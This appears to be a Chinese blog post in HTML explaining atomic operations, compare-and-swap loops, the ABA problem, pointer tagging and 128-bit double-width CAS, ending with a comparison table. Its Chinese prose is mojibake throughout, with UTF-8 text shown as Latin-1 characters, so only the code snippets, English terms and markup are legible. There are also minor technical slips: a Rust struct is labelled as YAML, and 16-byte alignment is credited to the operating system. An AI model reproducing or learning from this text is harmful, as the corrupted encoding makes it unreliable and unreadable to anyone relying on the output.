<p>è¿™ä¸¤ä¸ªæ¦‚å¿µæ˜¯å¹¶å‘ç¼–ç¨‹ä¸­<strong>æœ€åº•å±‚ã€æœ€ç¡¬æ ¸</strong>çš„åŸºçŸ³</p>
<h2 data-id="heading-3">ä¸€ã€ Atomicï¼ˆåŸå­æ€§ï¼‰ï¼šè¦ä¹ˆå…¨åšï¼Œè¦ä¹ˆä¸åš</h2>
<p><strong>1. é—®é¢˜çš„æ ¹æºï¼š<code>i++</code>Â å…¶å®æ˜¯ä¸ªè°è¨€</strong>Â åœ¨å†™ä»£ç æ—¶ï¼Œä½ å†™äº†ä¸€å¥Â <code>count = count + 1</code>ï¼ˆæˆ–è€…Â <code>count++</code>ï¼‰ï¼Œä½ è§‰å¾—è¿™æ˜¯ä¸€æ­¥æ“ä½œã€‚ ä½†åœ¨ CPU çœ¼é‡Œï¼Œè¿™å…¶å®æ˜¯<strong>ä¸‰æ­¥</strong>ï¼š</p>
<ol>
<li><strong>Read:</strong> Â æŠŠå†…å­˜é‡Œçš„Â <code>count</code>Â å€¼è¯»åˆ° CPU å¯„å­˜å™¨é‡Œï¼ˆæ¯”å¦‚è¯»åˆ° 0ï¼‰ã€‚</li>
<li><strong>Modify:</strong> Â åœ¨ CPU é‡ŒæŠŠè¿™ä¸ªå€¼åŠ  1ï¼ˆå˜æˆ 1ï¼‰ã€‚</li>
<li><strong>Write:</strong> Â æŠŠç®—å¥½çš„ 1 å†™å›å†…å­˜ã€‚</li>
</ol>
<p><strong>ææ€–æ•…äº‹ï¼š</strong> Â å¦‚æœçº¿ç¨‹ A å’Œçº¿ç¨‹ B åŒæ—¶åšè¿™ä»¶äº‹ï¼š</p>
<ul>
<li>A è¯»åˆ°äº† 0ã€‚</li>
<li>B åŒæ—¶ä¹Ÿè¯»åˆ°äº† 0ï¼ˆå› ä¸ºå®ƒè¿˜æ²¡æ¥å¾—åŠå˜ï¼‰ã€‚</li>
<li>A ç®—å‡º 1ï¼Œå†™å›å†…å­˜ã€‚</li>
<li>B ä¹Ÿç®—å‡º 1ï¼Œå†™å›å†…å­˜ã€‚</li>
<li><strong>ç»“æœï¼š</strong> Â æ˜æ˜åŠ äº†ä¸¤æ¬¡ï¼Œå†…å­˜é‡Œå´æ˜¯ 1ï¼Œè€Œä¸æ˜¯ 2ã€‚<strong>æ•°æ®â€œè¢«åäº†â€ã€‚</strong></li>
</ul>
<p><strong>2. Atomic çš„è¶…èƒ½åŠ›</strong>Â Atomicï¼ˆåŸå­æ“ä½œï¼‰å°±æ˜¯ä¸€ç§é­”æ³•ï¼Œå®ƒèƒ½å¼ºè¡ŒæŠŠé‚£â€œä¸‰æ­¥â€åˆå¹¶æˆ<strong>ä¸å¯åˆ†å‰²çš„ä¸€æ­¥</strong>ã€‚</p>
<ul>
<li>
<p><strong>æ¯”å–»ï¼šç¬ç§»ã€‚</strong></p>
<ul>
<li>æ™®é€šæ“ä½œåƒèµ°è·¯ï¼šä½ å¯èƒ½èµ°åˆ°ä¸€åŠè¢«ç»Šå€’ï¼Œæˆ–è€…è¢«äººæ’é˜Ÿã€‚</li>
<li>Atomic æ“ä½œåƒç¬ç§»ï¼šä½ è¦ä¹ˆè¿˜åœ¨åŸåœ°ï¼ˆæ“ä½œæ²¡å‘ç”Ÿï¼‰ï¼Œè¦ä¹ˆå·²ç»åˆ°äº†ç»ˆç‚¹ï¼ˆæ“ä½œå®Œæˆäº†ï¼‰ã€‚<strong>ä½ æ°¸è¿œä¸ä¼šå¤„äºâ€œåŠè·¯â€çš„çŠ¶æ€ã€‚</strong></li>
</ul>
</li>
</ul>
<p>åœ¨ Rust æˆ– C++ ä¸­ï¼Œå½“ä½ ä½¿ç”¨Â <code>AtomicI32</code>Â çš„Â <code>fetch_add</code>Â æ—¶ï¼ŒCPU ä¼šä¿è¯ï¼šæ— è®ºå¤šå°‘ä¸ªçº¿ç¨‹åŒæ—¶æŠ¢ï¼Œæœ€ååŠ å‡ºæ¥çš„æ•°ä¸€å®šæ˜¯å‡†çš„ã€‚</p>
<hr/>
<h3 data-id="heading-4">äºŒã€ CAS (Compare-and-Swap)ï¼šä¸€ç§â€œä¹è§‚â€çš„èµŒå¾’å¿ƒæ€</h3>
<p>Atomic æ˜¯<strong>ç»“æœ</strong>ï¼ˆæˆ‘ä»¬è¦å®ç°åŸå­æ€§ï¼‰ï¼Œé‚£ä¹ˆ CAS å°±æ˜¯å®ç°è¿™ä¸ªç»“æœçš„<strong>æ‰‹æ®µ</strong>ï¼ˆCPU æŒ‡ä»¤ï¼‰ã€‚</p>
<p>CAS å…¨ç§°æ˜¯Â <strong>Compare and Swapï¼ˆæ¯”è¾ƒå¹¶äº¤æ¢ï¼‰</strong> ã€‚å®ƒæ˜¯æ— é”ç¼–ç¨‹ï¼ˆLock-freeï¼‰çš„æ ¸å¿ƒã€‚</p>
<h4 data-id="heading-5">1. å®ƒçš„é€»è¾‘æ˜¯è¿™æ ·çš„</h4>
<p>CAS æŒ‡ä»¤åŒ…å«ä¸‰ä¸ªå‚æ•°ï¼š</p>
<ul>
<li><strong>å†…å­˜åœ°å€ (V)</strong> ï¼šä½ è¦æ”¹å“ªä¸ªå˜é‡ï¼Ÿ</li>
<li><strong>æœŸæœ›å€¼ (A)</strong> ï¼šä½ è§‰å¾—å®ƒç°åœ¨åº”è¯¥æ˜¯å¤šå°‘ï¼Ÿï¼ˆæ—§å€¼ï¼‰</li>
<li><strong>æ–°å€¼ (B)</strong> ï¼šä½ æƒ³æŠŠå®ƒæ”¹æˆå¤šå°‘ï¼Ÿ</li>
</ul>
<p><strong>CAS çš„å¿ƒé‡Œè¯ï¼ˆç‹¬ç™½ï¼‰ï¼š</strong></p>
<blockquote>
<p>â€œæˆ‘è¦æŠŠåœ°å€ V é‡Œçš„æ•°æ®æ”¹æˆ Bã€‚ä½†æ˜¯ï¼Œ<strong>é™¤é</strong>åœ°å€ V é‡Œçš„æ•°æ®æ­£å¦‚æˆ‘æ‰€æ–™ï¼Œæ˜¯ Aï¼Œæˆ‘æ‰æ”¹ã€‚å¦‚æœæˆ‘å‘ç° V é‡Œçš„æ•°æ®ä¸æ˜¯ Aï¼ˆè¯´æ˜è¢«åˆ«äººæ”¹è¿‡äº†ï¼‰ï¼Œæˆ‘å°±ä¸æ”¹äº†ï¼Œå‘Šè¯‰æˆ‘å¤±è´¥ã€‚â€</p>
</blockquote>
<h4 data-id="heading-6">2. é€šä¿—æ¡ˆä¾‹ï¼š<strong>è¯•è¡£é—´ä¸æŒ‚ç‰Œ</strong></h4>
<p>æƒ³è±¡ä¸€ä¸ªè¯•è¡£é—´ï¼Œé—¨ä¸ŠæŒ‚ç€ç‰Œå­ï¼Œä¸Šé¢å†™ç€çŠ¶æ€ï¼ˆâ€œç©ºâ€ æˆ– â€œæœ‰äººâ€ï¼‰ã€‚</p>
<ul>
<li>
<p><strong>åœºæ™¯ï¼š</strong> Â ä½ æƒ³è¿›å»è¯•è¡£æœã€‚</p>
</li>
<li>
<p><strong>æ­¥éª¤ 1 (Read):</strong> Â ä½ çœ‹äº†ä¸€çœ¼ç‰Œå­ï¼Œå†™ç€â€œç©ºâ€ã€‚</p>
</li>
<li>
<p><strong>æ­¥éª¤ 2 (Calculate):</strong> Â ä½ å‡†å¤‡æŠŠç‰Œå­ç¿»æˆâ€œæœ‰äººâ€ã€‚</p>
</li>
<li>
<p><strong>æ­¥éª¤ 3 (CAS æ“ä½œ):</strong></p>
<ul>
<li>åœ¨ä½ ä¼¸æ‰‹å»ç¿»ç‰Œå­çš„ä¸€ç¬é—´ï¼ˆæçŸ­çš„æ—¶é—´ï¼‰ï¼Œä½ å¿…é¡»å†æ¬¡ç¡®è®¤ï¼š <strong>â€œç‰Œå­ç°åœ¨è¿˜æ˜¯â€˜ç©ºâ€™å­—å—ï¼Ÿâ€</strong></li>
<li><strong>æƒ…å†µä¸€ï¼ˆæˆåŠŸï¼‰ï¼š</strong> Â æ˜¯â€œç©ºâ€ã€‚å•ªï¼ä½ æŠŠå®ƒç¿»æˆäº†â€œæœ‰äººâ€ï¼Œä½ è¿›å»äº†ã€‚</li>
<li><strong>æƒ…å†µäºŒï¼ˆå¤±è´¥ï¼‰ï¼š</strong> Â å°±åœ¨ä½ ä½å¤´çš„ä¸€ç¬é—´ï¼Œåˆ«äººæŠ¢å…ˆå†²è¿›å»æŠŠç‰Œå­ç¿»æˆäº†â€œæœ‰äººâ€ã€‚ä½ ä¼¸æ‰‹æ—¶å‘ç°ç‰Œå­å·²ç»æ˜¯â€œæœ‰äººâ€äº†ï¼ˆä¸ä½ æœŸæœ›çš„â€œç©ºâ€ä¸ç¬¦ï¼‰ã€‚<strong>æ“ä½œå¤±è´¥ï¼Œä½ ä¸èƒ½ç¿»ç‰Œå­ã€‚</strong></li>
</ul>
</li>
</ul>
<h4 data-id="heading-7">3. å¤±è´¥äº†æ€ä¹ˆåŠï¼Ÿï¼ˆè‡ªæ—‹ Loopï¼‰</h4>
<p>CAS æœ€ç»å…¸çš„ä½¿ç”¨æ¨¡å¼æ˜¯<strong>é…åˆå¾ªç¯ï¼ˆLoopï¼‰</strong> ã€‚</p>
<p>å¦‚æœåœ¨è¯•è¡£é—´é—¨å£å¤±è´¥äº†ï¼ˆCAS è¿”å› Falseï¼‰ï¼Œä½ é€šå¸¸ä¸ä¼šå›å®¶ï¼Œè€Œæ˜¯ï¼š</p>
<ol>
<li><strong>é‡æ–°è¯»å–ï¼š</strong> Â çœ‹çœ‹ç°åœ¨ç‰Œå­æ˜¯ä»€ä¹ˆå­—ï¼ˆå“¦ï¼Œæ˜¯â€œæœ‰äººâ€ï¼‰ã€‚</li>
<li><strong>é‡æ–°æœŸæœ›ï¼š</strong> Â é‚£æˆ‘æœŸæœ›å®ƒå˜æˆâ€œç©ºâ€ï¼ˆç­‰é‡Œé¢äººå‡ºæ¥ï¼‰ã€‚</li>
<li><strong>å†æ¬¡å°è¯• CASï¼š</strong> Â ä¸€ç›´è¯•ï¼Œç›´åˆ°æˆåŠŸä¸ºæ­¢ã€‚</li>
</ol>
<p>è¿™åœ¨ä»£ç é‡Œå«Â <strong>CAS Loop</strong>Â æˆ–è€…Â <strong>è‡ªæ—‹ï¼ˆSpinï¼‰</strong> ã€‚</p>
<hr/>
<h3 data-id="heading-8">ä¸‰ã€ æ€»ç»“ï¼šAtomic å’Œ CAS çš„å…³ç³»</h3>
<ul>
<li><strong>Atomic</strong>Â æ˜¯æˆ‘ä»¬æƒ³è¦çš„<strong>å®‰å…¨æ„Ÿ</strong>ï¼ˆä¿è¯æ•°æ®ä¸ä¹±ï¼‰ã€‚</li>
<li><strong>CAS</strong>Â æ˜¯ CPU æä¾›çš„<strong>åº•å±‚æŒ‡ä»¤</strong>ï¼ˆæ¯”å¦‚ x86 çš„Â <code>cmpxchg</code>Â æŒ‡ä»¤ï¼‰ï¼Œç”¨æ¥æ„å»ºè¿™ç§å®‰å…¨æ„Ÿã€‚</li>
</ul>
<p><strong>å®ƒä»¬ä¸â€œé”â€çš„åŒºåˆ«ï¼š</strong></p>
<ul>
<li><strong>Mutexï¼ˆé”ï¼‰ï¼š</strong> Â æ˜¯<strong>æ‚²è§‚</strong>çš„ã€‚å®ƒè§‰å¾—è‚¯å®šæœ‰äººæŠ¢ï¼Œæ‰€ä»¥å…ˆæŠŠé—¨é”æ­»ï¼Œè°ä¹Ÿåˆ«è¿›ï¼Œæˆ‘æ”¹å®Œäº†å†å¼€é—¨ã€‚ï¼ˆçº¿ç¨‹ä¼šç¡è§‰ï¼Œåˆ‡æ¢å¼€é”€å¤§ï¼‰</li>
<li><strong>CASï¼ˆåŸå­ï¼‰ï¼š</strong> Â æ˜¯<strong>ä¹è§‚</strong>çš„ã€‚å®ƒè§‰å¾—åº”è¯¥æ²¡äººæŠ¢ï¼Œæˆ‘ç›´æ¥å»æ”¹æ”¹çœ‹ã€‚å“å‘€è¢«æŠ¢äº†ï¼Ÿæ²¡äº‹ï¼Œæˆ‘é‡è¯•ä¸€æ¬¡ã€‚ï¼ˆçº¿ç¨‹ä¸€ç›´é†’ç€ï¼Œåœ¨ CPU ä¸Šç©ºè½¬ï¼Œå“åº”æå¿«ï¼Œä½†å¦‚æœå†²çªå¤ªå‰§çƒˆä¼šæµªè´¹ CPUï¼‰ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-9">å››ã€ é‚£ä¸ªè‘—åçš„å‘ï¼šABA é—®é¢˜</h3>
<p>è®² CAS å¿…é¡»è®² ABAï¼Œè¿™æ˜¯é¢è¯•å¿…è€ƒé¢˜ï¼Œä¹Ÿæ˜¯é€»è¾‘æ¼æ´ã€‚</p>
<p><strong>æ¡ˆä¾‹ï¼šä½ çš„ç§æˆ¿é’±</strong>Â å‡è®¾ä½ æœ‰ä¸€ä¸ªé“ç›’å­ï¼Œé‡Œé¢å­˜äº†Â <strong>100 å—é’±</strong>ã€‚</p>
<ol>
<li>
<p><strong>ä½  (çº¿ç¨‹ A)</strong> Â çœ‹äº†ä¸€çœ¼ç›’å­ï¼šæœ‰ 100 å—ã€‚ä½ å‡†å¤‡å­˜æˆ 200 å—ã€‚ï¼ˆæœŸæœ› 100ï¼Œæ–°å€¼ 200ï¼‰ã€‚</p>
</li>
<li>
<p><strong>å°±åœ¨è¿™æ—¶ï¼Œä½ è€å©† (çº¿ç¨‹ B)</strong> Â è¿‡æ¥ï¼š</p>
<ul>
<li>å¥¹æ‹¿èµ°äº† 100 å—å»ä¹°èœã€‚ï¼ˆç›’å­å˜ 0ï¼‰</li>
<li>å¥¹è§‰å¾—è‡ªå·±èŠ±å¤šäº†ï¼Œåˆä»è¿™ä¸€ç™¾å—é‡Œæ‰¾é›¶é’±æˆ–è€…å€Ÿé’±ï¼Œåˆæ”¾å›å»äº† 100 å—ã€‚ï¼ˆç›’å­å˜å› 100ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>ä½  (çº¿ç¨‹ A)</strong> Â å›è¿‡ç¥æ¥è¿›è¡Œ CAS æ“ä½œï¼š</p>
<ul>
<li>æ£€æŸ¥ç›’å­ï¼š<strong>å’¦ï¼Ÿè¿˜æ˜¯ 100 å—ï¼</strong> ï¼ˆç¬¦åˆæœŸæœ›å€¼ï¼‰</li>
<li><strong>CAS æˆåŠŸï¼</strong> Â ä½ æŠŠ 100 æ”¹æˆäº† 200ã€‚</li>
</ul>
</li>
</ol>
<p><strong>é—®é¢˜åœ¨å“ªï¼Ÿ</strong> Â è™½ç„¶é’±æ•°æ˜¯å¯¹çš„ï¼Œä½†<strong>è¿™ 100 å—å·²ç»ä¸æ˜¯åŸæ¥çš„ 100 å—äº†ï¼</strong> Â ç›’å­çš„çŠ¶æ€å…¶å®å‘ç”Ÿäº†å˜åŒ–ï¼ˆå¯èƒ½ä¸­é—´å¤¹å¸¦äº†ä¸€å¼ æ”¶æ®ï¼Œæˆ–è€…é’±çš„æ–°æ—§ç¨‹åº¦å˜äº†ï¼‰ã€‚</p>
<p><strong>åœ¨ç¼–ç¨‹ä¸­çš„å±å®³ï¼š</strong> Â å¦‚æœé‚£ä¸ªâ€œ100â€æ˜¯ä¸€ä¸ª<strong>å†…å­˜åœ°å€æŒ‡é’ˆ</strong>ï¼ŒABA é—®é¢˜å¯èƒ½å¯¼è‡´ä½ æŒ‡å‘äº†ä¸€ä¸ªå·²ç»è¢«é‡Šæ”¾åˆè¢«é‡æ–°åˆ†é…çš„å†…å­˜å—ï¼Œç¨‹åºä¼šç›´æ¥çˆ†ç‚¸ã€‚</p>
<p><strong>æ€ä¹ˆè§£å†³ï¼Ÿ</strong> Â åŠ ä¸ª<strong>ç‰ˆæœ¬å·</strong>ã€‚ ç›’å­ä¸å…‰å†™â€œ100â€ï¼Œè¿˜å†™ç€â€œç‰ˆæœ¬ 1â€ã€‚è€å©†åŠ¨è¿‡ä¹‹åï¼Œå˜æˆâ€œç‰ˆæœ¬ 2â€ã€‚ ä½  CAS çš„æ—¶å€™æ£€æŸ¥ï¼šæœŸæœ›æ˜¯â€œ100 ä¸” ç‰ˆæœ¬ 1â€ã€‚å¦‚æœå‘ç°æ˜¯â€œ100 ä¸” ç‰ˆæœ¬ 2â€ï¼Œå°±çŸ¥é“è¢«åŠ¨è¿‡äº†ã€‚</p>
<p>æˆ‘ä»¬æŠŠè¿™ä¸¤ç§æƒ…å†µï¼ˆè— vs ä¸è—ï¼‰å¯¹Â <strong>Atomic/CAS æ“ä½œçš„å…·ä½“å½±å“</strong>Â åšä¸€ä¸ªæ·±åº¦æ‹†è§£ã€‚</p>
<hr/>
<h3 data-id="heading-10">æƒ…å†µä¸€ï¼šä¸è—åœ¨æŒ‡é’ˆé‡Œï¼ˆå¤–æŒ‚ç‰ˆæœ¬å· -&gt; å˜æˆå®½æ•°æ®ï¼‰</h3>
<p>è¿™æ˜¯ä½ æœ€å…³å¿ƒçš„ç‚¹ã€‚å‡è®¾ä½ çš„æ•°æ®æœ¬èº«å°±æ˜¯ 64 ä½çš„ï¼ˆæ¯”å¦‚ä¸€ä¸ªæ•´æ•°Â <code>usize</code>ï¼‰ï¼Œä½ åˆç¡¬åŠ äº†ä¸€ä¸ª 64 ä½çš„Â <code>version</code>ã€‚ ç°åœ¨çš„æ€»æ•°æ®é‡æ˜¯ï¼š<strong>64ä½ + 64ä½ = 128ä½</strong>ã€‚</p>
<h4 data-id="heading-11">1. å¯¹ CPU ç¡¬ä»¶çš„å½±å“ï¼ˆè¿™æ˜¯æœ€å¤§çš„ç“¶é¢ˆï¼‰</h4>
<p>ç»å¤§å¤šæ•°æ™®é€š CPU çš„é€šç”¨å¯„å­˜å™¨åªæœ‰ 64 ä½å®½ã€‚</p>
<ul>
<li><strong>æ ‡å‡† CAS æŒ‡ä»¤ (<code>cmpxchg</code>)ï¼š</strong> Â ä¸€æ¬¡åªèƒ½æ¬è¿ 64 ä½ã€‚å®ƒæ ¹æœ¬æ¬ä¸åŠ¨ 128 ä½çš„æ•°æ®ã€‚</li>
<li><strong>å¼ºè¡Œæ¬è¿çš„åæœï¼š</strong> Â å¦‚æœä½ æ²¡æœ‰ç‰¹æ®ŠæŒ‡ä»¤æ”¯æŒï¼Œä½ æ— æ³•ä¿è¯è¿™ 128 ä½æ˜¯â€œåŒæ—¶â€å˜åŒ–çš„ã€‚å¯èƒ½æ”¹äº†å‰ 64 ä½ï¼Œå 64 ä½è¿˜æ²¡æ”¹ï¼Œè¿™æ—¶å€™åˆ«çš„çº¿ç¨‹è¯»è¿›æ¥ï¼Œæ•°æ®å°±è£‚å¼€äº†ï¼ˆTearingï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-12">2. è§£å†³æ–¹æ¡ˆï¼šå¿…é¡»åŠ¨ç”¨â€œé‡å‹æ­¦å™¨â€</h4>
<p>ä¸ºäº†å¤„ç†è¿™ç§ 128 ä½çš„æƒ…å†µï¼ŒCPU å‚å•†ï¼ˆIntel/AMD/ARMï¼‰æä¾›äº†ç‰¹æ®ŠæŒ‡ä»¤ï¼Œæ¯”å¦‚ x86 ä¸Šçš„Â <code>CMPXCHG16B</code>ï¼ˆCompare and Exchange 16 Bytesï¼‰ã€‚</p>
<ul>
<li><strong>å½±å“ A - å…¼å®¹æ€§é—®é¢˜ï¼š</strong> Â å¹¶ä¸æ˜¯æ‰€æœ‰ CPU éƒ½æ”¯æŒè¿™ä¸ªæŒ‡ä»¤ï¼ˆè™½ç„¶ç°ä»£æ¡Œé¢ CPU éƒ½æ”¯æŒï¼Œä½†åœ¨ä¸€äº›åµŒå…¥å¼æˆ–è€æ—§æ¶æ„ä¸Šä¼šç›´æ¥æŠ¥é”™ï¼‰ã€‚</li>
<li><strong>å½±å“ B - æ€§èƒ½å¼€é”€ï¼š</strong> Â è¿™ç§åŒå€å®½åº¦çš„åŸå­æ“ä½œï¼Œæ¯”æ™®é€šçš„ 64 ä½ CAS è¦æ…¢ä¸€äº›ï¼ˆè™½ç„¶è¿˜æ˜¯å¾ˆå¿«ï¼Œä½†åœ¨æé«˜å¹¶å‘ä¸‹èƒ½æµ‹å‡ºå·®è·ï¼‰ã€‚</li>
<li><strong>å½±å“ C - å†…å­˜å¯¹é½ï¼ˆAlignmentï¼‰ï¼š</strong> Â è¿™æ˜¯å¾ˆå¤š Rust/C++ å¼€å‘è€…çš„å™©æ¢¦ã€‚ä½¿ç”¨ 128 ä½åŸå­æ“ä½œæ—¶ï¼Œæ“ä½œç³»ç»Ÿè¦æ±‚è¿™ä¸ªå˜é‡åœ¨å†…å­˜ä¸­çš„åœ°å€å¿…é¡»æ˜¯Â <strong>16å­—èŠ‚å¯¹é½</strong>Â çš„ã€‚å¦‚æœæ²¡å¯¹é½ï¼ŒCPU ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œç¨‹åºç›´æ¥å´©ç›˜ï¼ˆPanicï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-13">3. Rust ä¸­çš„ä½“ç°</h4>
<p>åœ¨ Rust ä¸­ï¼Œå¦‚æœä½ æƒ³åšè¿™ç§æ“ä½œï¼Œé€šå¸¸éœ€è¦ä½¿ç”¨Â <code>AtomicU128</code>ï¼ˆç›®å‰åœ¨æŸäº›å¹³å°ä¸Šè¿˜æ˜¯ä¸ç¨³å®šç‰¹æ€§Â <code>unstable</code>ï¼Œæˆ–è€…éœ€è¦ç‰¹å®š CPU feature å¼€å¯ï¼‰ã€‚</p>
<hr/>
<h3 data-id="heading-14">æƒ…å†µäºŒï¼šè—åœ¨æŒ‡é’ˆé‡Œï¼ˆPointer Tagging / å‹ç¼©æµï¼‰</h3>
<p>è¿™å°±æ˜¯æ‰€è°“çš„â€œæŠŠç‰ˆæœ¬å·å¡è¿›æŒ‡é’ˆæ²¡ç”¨çš„ä½é‡Œâ€ã€‚</p>
<h4 data-id="heading-15">1. ä¸ºä»€ä¹ˆèƒ½è—ï¼Ÿ</h4>
<p>ç°åœ¨çš„ 64 ä½ç”µè„‘ï¼ˆx86-64ï¼‰ï¼Œè™½ç„¶æŒ‡é’ˆä¹Ÿæ˜¯ 64 ä½é•¿ï¼Œä½†å…¶å®åªç”¨äº†<strong>ä½ 48 ä½</strong>æ¥å¯»å€ï¼Œ<strong>é«˜ 16 ä½</strong>å…¨æ˜¯ 0ï¼ˆæˆ–è€…å…¨æ˜¯ 1ï¼‰ã€‚</p>
<h4 data-id="heading-16">2. å¯¹ Atomic/CAS çš„å½±å“ï¼ˆæå°ï¼‰</h4>
<ul>
<li>
<p><strong>ç¡¬ä»¶å±‚é¢ï¼š</strong> Â å› ä¸ºä½ æŠŠç‰ˆæœ¬å·å¡è¿›å»äº†ï¼Œæ•´ä½“é•¿åº¦<strong>ä¾ç„¶æ˜¯ 64 ä½</strong>ã€‚ æ‰€ä»¥ï¼Œä½ å¯ä»¥ç›´æ¥ä½¿ç”¨æœ€æ™®é€šã€æœ€å¿«ã€å…¼å®¹æ€§æœ€å¥½çš„æ ‡å‡† CAS æŒ‡ä»¤ã€‚<strong>ç¡¬ä»¶æ¯«æ— å‹åŠ›ã€‚</strong></p>
</li>
<li>
<p><strong>ä»£ç å±‚é¢ï¼ˆè¿™æ˜¯éº»çƒ¦ç‚¹ï¼‰ï¼š</strong> Â å½±å“åœ¨äº<strong>ä½ å–æ•°æ®çš„æ—¶å€™</strong>ã€‚</p>
<ul>
<li><strong>å­˜çš„æ—¶å€™ï¼š</strong> Â è¦åšä½è¿ç®—ï¼ˆæ‹¼è£…ï¼‰ï¼š<code>ptr | (version &lt;&lt; 48)</code></li>
<li><strong>å–çš„æ—¶å€™ï¼š</strong> Â è¦åšä½è¿ç®—ï¼ˆæ‹†è§£ï¼‰ï¼š<code>val &amp; 0x0000FFFFFFFFFFFF</code></li>
<li><strong>å¦‚æœä½ å¿˜äº†æ‹†ï¼š</strong> Â ç›´æ¥æ‹¿è¿™ä¸ªå¸¦è„æ•°æ®çš„æŒ‡é’ˆå»è¯»å†…å­˜ï¼Œ<strong>ç¨‹åºç«‹åˆ»æ®µé”™è¯¯ï¼ˆSegFaultï¼‰å´©æºƒ</strong>ï¼Œå› ä¸ºå®ƒæŒ‡å‘äº†ä¸€ä¸ªä¸å­˜åœ¨çš„éæ³•åœ°å€ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-17">3. ç‰ˆæœ¬å·æº¢å‡ºé£é™©</h4>
<p>å› ä¸ºåªæœ‰ 16 ä½ç©ºé—´ç»™ä½ è—ï¼Œç‰ˆæœ¬å·æœ€å¤šåˆ° 65535ã€‚å¦‚æœé«˜å¹¶å‘ä¸‹å˜åŒ–æå¿«ï¼Œç‰ˆæœ¬å·ç¬é—´è½¬å®Œä¸€åœˆå›åˆ° 0ï¼Œ<strong>ABA é—®é¢˜ä¼šå¤æ´»</strong>ã€‚</p>
<hr/>
<h3 data-id="heading-18">æƒ…å†µä¸‰ï¼šå¦‚æœæˆ‘åˆä¸æƒ³è—ï¼ŒCPU åˆä¸æ”¯æŒ 128 ä½æ€ä¹ˆåŠï¼Ÿ</h3>
<p>è¿™å°±æ˜¯<strong>æœ€å¤§çš„å½±å“</strong>â€”â€”ä½ <strong>ä¸èƒ½</strong>å†å•çº¯ç”¨ CAS äº†ã€‚</p>
<p>å¾ˆå¤šåˆå­¦è€…ä¼šæƒ³ï¼šâ€œæˆ‘èƒ½ä¸èƒ½æä¸¤ä¸ª Atomic å˜é‡ï¼Œä¸€ä¸ªå­˜é’±ï¼Œä¸€ä¸ªå­˜ç‰ˆæœ¬ï¼Ÿâ€</p>
<p>Rust</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">struct</span> <span class="hljs-string">SafeMoney</span> {
    <span class="hljs-attr">money:</span> <span class="hljs-string">AtomicU64</span>,
    <span class="hljs-attr">version:</span> <span class="hljs-string">AtomicU64</span>,
}
</code></pre>
<p><strong>ç»å¯¹ä¸è¡Œï¼</strong> Â å› ä¸ºä½ æ— æ³•<strong>åŒæ—¶</strong>é”ä½è¿™ä¸¤ä¸ªå˜é‡ã€‚</p>
<ol>
<li>çº¿ç¨‹ A æ”¹äº†Â <code>money</code>Â (CAS æˆåŠŸ)ã€‚</li>
<li><strong>ï¼ˆæ—¶é—´é—´éš™ï¼‰</strong> Â çº¿ç¨‹ B è¯»äº†Â <code>money</code>ã€‚</li>
<li>çº¿ç¨‹ A æ”¹äº†Â <code>version</code>ã€‚</li>
</ol>
<p>åœ¨è¿™ä¸ªâ€œæ—¶é—´é—´éš™â€é‡Œï¼Œæ•°æ®å¤„äº<strong>ä¸ä¸€è‡´</strong>çŠ¶æ€ã€‚è¿™å°±ä¸æ˜¯åŸå­æ“ä½œäº†ã€‚</p>
<p><strong>æ­¤æ—¶çš„å”¯ä¸€è§£æ³•ï¼š</strong> Â é€€å›åˆ°ä½¿ç”¨Â <code>Mutex</code>ï¼ˆäº’æ–¥é”ï¼‰ã€‚å“ªæ€•å†æ…¢ï¼Œä¹Ÿå¾—ç”¨é”æŠŠè¿™ä¸¤ä¸ªå˜é‡åŒ…èµ·æ¥ï¼Œå˜æˆä¸€ä¸ªæ•´ä½“ã€‚</p>
<h3 data-id="heading-19">æ€»ç»“ï¼šCAS å¯¹ Atomic çš„å½±å“è¡¨</h3>








































<table><thead><tr><th>æ–¹æ¡ˆ</th><th>æ•°æ®å½¢æ€</th><th>ç¡¬ä»¶ CAS æŒ‡ä»¤</th><th>å½±å“/ä»£ä»·</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><strong>æ ‡å‡† CAS</strong></td><td>ä»…æ•°æ® (64ä½)</td><td>æ™®é€šÂ <code>cmpxchg</code></td><td><strong>æ— </strong>ã€‚æœ€å¿«ï¼ŒåŸç”Ÿæ”¯æŒã€‚</td><td>ä¸æ‹…å¿ƒ ABA çš„ç®€å•è®¡æ•°å™¨</td></tr><tr><td><strong>æŒ‡é’ˆæ ‡è®°</strong></td><td>æ•°æ®+ç‰ˆæœ¬æŒ¤åœ¨ 64ä½é‡Œ</td><td>æ™®é€šÂ <code>cmpxchg</code></td><td><strong>ä»£ç å¤æ‚</strong>ã€‚éœ€è¦ä½è¿ç®—ï¼Œç‰ˆæœ¬å·ç©ºé—´å°ã€‚</td><td>é“¾è¡¨ã€æ ˆã€é˜Ÿåˆ— (Treiber Stack)</td></tr><tr><td><strong>åŒå®½ CAS</strong></td><td>æ•°æ®+ç‰ˆæœ¬ = 128ä½</td><td>ç‰¹æ®ŠÂ <code>cmpxchg16b</code></td><td><strong>å…¼å®¹æ€§/å¯¹é½</strong>ã€‚éƒ¨åˆ†å¹³å°ä¸æ”¯æŒï¼Œå¿…é¡»16å­—èŠ‚å¯¹é½ã€‚</td><td>éœ€è¦å®Œæ•´ç‰ˆæœ¬å·çš„å¤æ‚ç»“æ„</td></tr><tr><td><strong>åˆ†å¼€å­˜</strong></td><td>æ•°æ® Atomic, ç‰ˆæœ¬ Atomic</td><td><strong>æ— </strong>Â (åšä¸åˆ°)</td><td><strong>é€»è¾‘é”™è¯¯</strong>ã€‚æ— æ³•ä¿è¯ä¸¤è€…åŒæ—¶å˜ã€‚</td><td><strong>ä¸å¯ç”¨</strong>ï¼Œå¿…é¡»æ¢æˆé”</td></tr></tbody></table>
